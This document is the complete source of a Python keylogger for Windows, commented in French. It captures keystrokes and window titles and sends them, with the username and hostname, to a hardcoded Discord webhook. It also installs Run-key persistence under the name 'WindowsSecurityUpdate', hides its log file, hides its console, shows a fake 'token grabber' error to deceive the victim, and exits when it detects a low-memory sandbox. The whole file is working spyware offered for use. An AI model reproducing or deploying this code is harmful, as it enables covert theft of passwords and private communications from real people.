import os
import sys
import json
import time
import threading
import subprocess
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import HTTPError

# Configuration du webhook
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538353192818057228/-a0gYrruzcIyfPZWWw-TeKq3F66R5r-XbmWSLUm_4FXHIvLtx9P_SMJq0bXDLoNLm2aI"

# Fichier temporaire pour stocker les frappes avant envoi
LOG_FILE = os.path.join(os.environ.get('TEMP', '/tmp'), 'sysupdate.tmp')
HIDDEN_ATTR = 0x02 if os.name == 'nt' else 0

class AdvancedKeylogger:
    def __init__(self):
        self.buffer = []
        self.last_send = time.time()
        self.running = False
        self.window_title = "Unknown"
        
    def get_active_window(self):
        """Récupère le titre de la fenêtre active"""
        try:
            if os.name == 'nt':
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32
                
                hwnd = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
            return "Unknown"
        except:
            return "Unknown"
    
    def key_callback(self, event):
        """Callback pour chaque touche pressée"""
        try:
            current_window = self.get_active_window()
            if current_window != self.window_title:
                self.window_title = current_window
                self.buffer.append(f"\n\n[{self.window_title}]\n")
            
            key = event.name
            
            # Gestion des touches spéciales
            if len(key) > 1:
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "\n"
                    self.send_logs()  # Envoi immédiat sur Enter
                elif key == "tab":
                    key = "[TAB]"
                elif key == "backspace":
                    key = "[BACK]"
                elif key == "shift":
                    key = "[SHIFT]"
                elif key == "ctrl":
                    key = "[CTRL]"
                elif key == "alt":
                    key = "[ALT]"
                else:
                    key = f"[{key.upper()}]"
            
            self.buffer.append(key)
            
            # Envoi automatique toutes les 30 secondes ou si buffer > 50 caractères
            if time.time() - self.last_send > 30 or len(self.buffer) > 50:
                self.send_logs()
                
        except Exception as e:
            pass
    
    def send_logs(self):
        """Envoie les logs au webhook Discord"""
        if not self.buffer:
            return
            
        try:
            message = "".join(self.buffer)
            if not message.strip():
                return
                
            # Informations système
            user = os.environ.get('USERNAME', 'Unknown')
            computer = os.environ.get('COMPUTERNAME', 'Unknown')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            embed = {
                "title": f"📝 Keylog - {user}@{computer}",
                "description": f"```{message}```",
                "color": 0x2f3136,
                "footer": {"text": f"Window: {self.window_title} • {timestamp}"},
                "timestamp": datetime.utcnow().isoformat()
            }
            
            payload = {
                "username": "System Logger",
                "embeds": [embed],
                "content": f"**Nouvelles frappes détectées** ||`{user}`||"
            }
            
            req = Request(
                WEBHOOK_URL,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
                method='POST'
            )
            
            response = urlopen(req, timeout=10)
            self.buffer = []  # Vide le buffer après envoi
            self.last_send = time.time()
            
        except Exception as e:
            # Sauvegarde locale si échec d'envoi
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"\n[{datetime.now()}] {''.join(self.buffer)}")
            self.buffer = []
    
    def start(self):
        """Démarre le keylogger"""
        self.running = True
        
        # Masque le fichier log s'il existe
        if os.path.exists(LOG_FILE) and os.name == 'nt':
            try:
                ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, HIDDEN_ATTR)
            except:
                pass
        
        # Hook clavier global
        try:
            import keyboard
            keyboard.on_release(callback=self.key_callback)
            
            # Boucle infinie pour maintenir le programme actif
            while self.running:
                time.sleep(1)
                # Vérification périodique d'envoi
                if time.time() - self.last_send > 60:
                    self.send_logs()
                    
        except ImportError:
            # Fallback sans bibliothèque keyboard (moins fiable)
            self._fallback_keylogger()
    
    def _fallback_keylogger(self):
        """Méthode alternative si keyboard n'est pas installé"""
        try:
            import win32api
            import win32con
            
            key_list = [
                (0x08, 'BACK'), (0x09, 'TAB'), (0x0D, 'ENTER'), (0x10, 'SHIFT'),
                (0x11, 'CTRL'), (0x12, 'ALT'), (0x14, 'CAPS'), (0x1B, 'ESC'),
                (0x20, 'SPACE'), (0x30, '0'), (0x31, '1'), (0x32, '2'), (0x33, '3'),
                (0x34, '4'), (0x35, '5'), (0x36, '6'), (0x37, '7'), (0x38, '8'),
                (0x39, '9'), (0x41, 'A'), (0x42, 'B'), (0x43, 'C'), (0x44, 'D'),
                (0x45, 'E'), (0x46, 'F'), (0x47, 'G'), (0x48, 'H'), (0x49, 'I'),
                (0x4A, 'J'), (0x4B, 'K'), (0x4C, 'L'), (0x4D, 'M'), (0x4E, 'N'),
                (0x4F, 'O'), (0x50, 'P'), (0x51, 'Q'), (0x52, 'R'), (0x53, 'S'),
                (0x54, 'T'), (0x55, 'U'), (0x56, 'V'), (0x57, 'W'), (0x58, 'X'),
                (0x59, 'Y'), (0x5A, 'Z')
            ]
            
            key_states = {}
            for key_code, _ in key_list:
                key_states[key_code] = False
            
            while self.running:
                for key_code, key_name in key_list:
                    if win32api.GetAsyncKeyState(key_code) & 0x8000:
                        if not key_states[key_code]:
                            key_states[key_code] = True
                            self.buffer.append(key_name if key_name not in ['SHIFT', 'CTRL', 'ALT'] else f'[{key_name}]')
                    else:
                        key_states[key_code] = False
                
                if len(self.buffer) > 30:
                    self.send_logs()
                time.sleep(0.01)
                
        except Exception as e:
            pass
    
    def stop(self):
        self.running = False
        self.send_logs()  # Envoi final

def fake_token_grabber_interface():
    """Interface factice de token grabber pour tromper la victime"""
    try:
        # Crée une fausse fenêtre d'erreur Windows
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.MessageBoxW(
                0,
                "Failed to grab Discord tokens.\n\nError: Access denied to Discord local storage.\nMake sure Discord is running and try again.",
                "Discord Token Grabber v2.1",
                0x10 | 0x0  # MB_ICONERROR | MB_OK
            )
        else:
            print("[ERROR] Discord Token Grabber: Access denied to local storage")
            
    except Exception as e:
        print(f"Error: {e}")

def persistence():
    """Installe une persistance au démarrage de Windows"""
    try:
        if os.name == 'nt':
            import winreg as reg
            
            # Chemin vers le script actuel
            script_path = os.path.abspath(sys.argv[0])
            
            # Clé registre Run
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, "WindowsSecurityUpdate", 0, reg.REG_SZ, f'pythonw "{script_path}"')
                
    except Exception as e:
        pass

def anti_analysis():
    """Détecte si l'environnement est une VM ou un sandbox"""
    try:
        if os.name == 'nt':
            import ctypes
            
            # Détection de VM par les périphériques
            vm_indicators = ["vmtools", "vmware", "virtualbox", "vbox"]
            
            # Vérification simple de la mémoire (VMs souvent avec peu de RAM)
            kernel32 = ctypes.windll.kernel32
            c_ulong = ctypes.c_ulong
            
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", c_ulong),
                    ("dwMemoryLoad", c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            
            memStatus = MEMORYSTATUSEX()
            memStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            kernel32.GlobalMemoryStatusEx(ctypes.byref(memStatus))
            
            # Si moins de 2GB de RAM, probablement une VM de test
            if memStatus.ullTotalPhys < 2147483648:  # 2GB
                return True
                
    except:
        pass
    
    return False

def main():
    """Fonction principale"""
    
    # Anti-analyse : quitte si VM détectée (évite les sandboxes)
    if anti_analysis():
        fake_token_grabber_interface()
        sys.exit(0)
    
    # Installe la persistance
    persistence()
    
    # Lance l'interface factice dans un thread séparé
    gui_thread = threading.Thread(target=fake_token_grabber_interface)
    gui_thread.daemon = True
    gui_thread.start()
    
    # Attente pour que l'interface s'affiche
    time.sleep(2)
    
    # Démarre le keylogger en arrière-plan
    logger = AdvancedKeylogger()
    
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        pass

if __name__ == "__main__":
    # Masque la console si exécuté en .pyw ou converti en exe
    if os.name == 'nt' and sys.executable.endswith('pythonw.exe'):
        main()
    else:
        # Relance sans console si nécessaire
        try:
            if os.name == 'nt':
                subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe'), __file__],
                               creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
        except:
            pass
        main()
